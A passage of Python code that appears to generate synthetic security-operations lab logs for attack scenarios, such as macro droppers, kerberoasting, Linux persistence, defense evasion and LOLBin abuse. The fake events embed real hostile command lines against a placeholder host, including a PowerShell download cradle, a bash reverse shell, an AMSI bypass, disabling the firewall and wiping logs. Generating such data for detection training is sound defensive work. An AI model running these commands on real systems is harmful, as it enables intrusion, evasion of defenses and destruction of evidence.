    ts = lab.base - timedelta(minutes=26)
    lab.process_creation(
        ts,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r"powershell.exe -NoProfile -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage2.ps1')",
        parent_image=r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
        parent_command_line=r'"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "C:\Users\analyst\Downloads\invoice.xlsm"',
        user=r"LAB\analyst",
    )
    lab.process_creation(
        ts + timedelta(seconds=45),
        r"C:\Windows\System32\mshta.exe",
        r"mshta.exe http://203.0.113.44/update.hta",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c mshta http://203.0.113.44/update.hta",
        user=r"LAB\analyst",
    )


def scenario_uac_bypass(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=24)
    lab.process_creation(
        ts,
        r"C:\Windows\System32\cmd.exe",
        r"cmd.exe /c C:\Users\Public\svc.exe",
        parent_image=r"C:\Windows\System32\fodhelper.exe",
        parent_command_line=r"C:\Windows\System32\fodhelper.exe",
        user=r"LAB\analyst",
    )


def scenario_kerberoasting(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=21)
    services = ["MSSQLSvc/sql01.lab.local:1433", "HTTP/intranet.lab.local", "CIFS/files01.lab.local"]
    for index, service in enumerate(services * 4):
        lab.security_event(
            start + timedelta(seconds=index * 9),
            "4769",
            {
                "ServiceName": service,
                "TicketEncryptionType": "0x17",
                "TargetUserName": "svc-backup",
                "IpAddress": ATTACKER,
            },
            f"Kerberos service ticket requested for {service}",
        )


def scenario_linux_persistence(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=19)
    lab.linux_file(start, "/etc/sudoers.d/backup", "root")
    lab.linux_file(start + timedelta(seconds=20), "/root/.ssh/authorized_keys", "root")
    lab.linux_file(start + timedelta(seconds=40), "/etc/systemd/system/updater.service", "root")
    lab.linux_process(start + timedelta(seconds=60), "bash -i >& /dev/tcp/203.0.113.44/4444 0>&1", "www-data")
    lab.linux_process(start + timedelta(minutes=2), "rm -rf /var/log/auth.log /var/log/syslog", "root")
    lab.linux_process(start + timedelta(minutes=2, seconds=20), "truncate -s 0 /var/log/auth.log", "root")


def scenario_defense_evasion(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=17)
    lab.process_creation(
        start,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r"powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        user=r"LAB\admin",
    )
    lab.process_creation(
        start + timedelta(seconds=20),
        r"C:\Windows\System32\netsh.exe",
        r"netsh advfirewall set allprofiles state off",
        user=r"LAB\admin",
    )
    lab.security_event(start + timedelta(seconds=50), "1102", {}, "The audit log was cleared.", host=WINDOWS_HOST)


def scenario_data_staging(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=15)
    lab.process_creation(
        start,
        r"C:\Windows\System32\cmd.exe",
        r'cmd.exe /c rar a C:\Users\Public\exfil.rar C:\Users\analyst\Documents\*',
        user=r"LAB\analyst",
    )
    lab.process_creation(
        start + timedelta(seconds=30),
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r"powershell.exe -c Compress-Archive -Path C:\Users\analyst\Documents\* -DestinationPath C:\Users\Public\exfil.zip",
        user=r"LAB\analyst",
    )


def scenario_service_stop(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=13)
    lab.service_stop(start, "VSS")
    lab.service_stop(start + timedelta(seconds=10), "SQLSERVERAGENT")


def scenario_lolbins(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=11)
    lab.process_creation(
        start,
        r"C:\Windows\System32\rundll32.exe",
        r"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:http://203.0.113.44/a.sct\")",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c rundll32 javascript:...",
        user=r"LAB\analyst",
    )
    lab.process_creation(
        start + timedelta(seconds=20),
        r"C:\Windows\System32\regsvr32.exe",
        r"regsvr32.exe /s /n /u /i:http://203.0.113.44/payload.sct scrobj.dll",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c regsvr32 /i:http://203.0.113.44/payload.sct scrobj.dll",
        user=r"LAB\analyst",
    )
    lab.process_creation(
        start + timedelta(seconds=40),
        r"C:\Windows\System32\mshta.exe",
        r"mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc.exe\"\"\"))",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c mshta vbscript:...",
        user=r"LAB\analyst",
    )


BUILDERS = {
    "baseline": scenario_baseline,
    "ssh-bruteforce": scenario_ssh_bruteforce,
    "password-spray": scenario_password_spray,
    "credential-dump": scenario_credential_dump,
    "encoded-powershell": scenario_encoded_powershell,
    "certutil-download": scenario_certutil_download,
    "service-persistence": scenario_service_persistence,
    "webshell": scenario_webshell,
    "new-user": scenario_new_user,
    "cron-persistence": scenario_cron_persistence,
    "ransomware": scenario_ransomware,
    "registry-persistence": scenario_registry_persistence,
    "wmi-persistence": scenario_wmi_persistence,
    "psexec-lateral": scenario_psexec_lateral,
    "discovery-burst": scenario_discovery_burst,
    "cloud-key-creation": scenario_cloud_key_creation,
    "port-scan": scenario_port_scan,
    "dns-tunnel": scenario_dns_tunnel,
    "exfil-transfer": scenario_exfil_transfer,
    "web-attack": scenario_web_attack,
    "office-macro": scenario_office_macro,
    "uac-bypass": scenario_uac_bypass,
    "kerberoasting": scenario_kerberoasting,
    "linux-persistence": scenario_linux_persistence,
    "defense-evasion": scenario_defense_evasion,
    "data-staging": scenario_data_staging,
    "service-stop": scenario_service_stop,
    "lolbins": scenario_lolbins,
}


def generate(scenario: str, seed: int = 1337, base_time: datetime | None = None) -> dict[str, list[dict[str, Any]]]:
    base_time = base_time or datetime.now(timezone.utc)
    lab = Lab(base_time, seed=seed)
    selected = SCENARIOS if scenario == "all" else (scenario,)
    for name in selected:
        BUILDERS[name](lab)

    for events in (lab.windows, lab.linux, lab.web, lab.cloud, lab.network):
        events.sort(key=lambda event: event["@timestamp"])
    return {
        "windows": lab.windows,
        "linux": lab.linux,
        "web": lab.web,
        "cloud": lab.cloud,
        "network": lab.network,
    }


def write_files(data: dict[str, list[dict[str, Any]]], out_dir: Path, append: bool = False) -> dict[str, int]:
    ensure_dir(out_dir)
    counts: dict[str, int] = {}
    for name, events in data.items():
        path = out_dir / f"{name}.ndjson"
        mode = "a" if append else "w"
        with path.open(mode, encoding="utf-8") as handle:
            for event in events:
                handle.write(json.dumps(event, sort_keys=False) + "\n")
        counts[name] = len(events)
    return counts


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate synthetic SOC lab telemetry")
    parser.add_argument("--scenario", default="all", choices=("all", *SCENARIOS))
    parser.add_argument("--out", default=str(LAB_LOGS_DIR))
    parser.add_argument("--seed", type=int, default=1337)
    parser.add_argument("--base-time", help="ISO-8601 anchor time, defaults to now")
    parser.add_argument("--append", action="store_true", help="append instead of overwriting")
    args = parser.parse_args()

    base_time = datetime.fromisoformat(args.base_time) if args.base_time else None
    data = generate(args.scenario, seed=args.seed, base_time=base_time)
    counts = write_files(data, Path(args.out), append=args.append)
    total = sum(counts.values())
    print(f"Wrote {total} synthetic events to {args.out}: " + ", ".join(f"{k}={v}" for k, v in counts.items()))
    return 0


if __name__ == "__main__":
    sys.exit(main())
